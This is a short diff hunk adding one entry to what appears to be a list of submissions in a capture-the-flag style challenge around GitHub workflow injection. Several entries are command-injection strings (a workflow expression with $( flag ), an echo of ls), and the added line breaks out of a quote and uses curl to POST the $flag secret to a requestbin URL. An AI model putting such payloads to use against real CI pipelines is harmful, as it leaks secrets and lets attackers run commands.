@@ -441,3 +441,4 @@ l0vexh:5000050001500025000350004500055000650007500085000950010500115001250013500
 FeverKing:${{ github.event.issue.number }} $( flag )
 ";echo \`ls\`"
 Nkzlxs:$flag
+sln-1550:';curl -X POST -d "$flag" http://requestbin.net/r/7vbx8ruo;echo '1
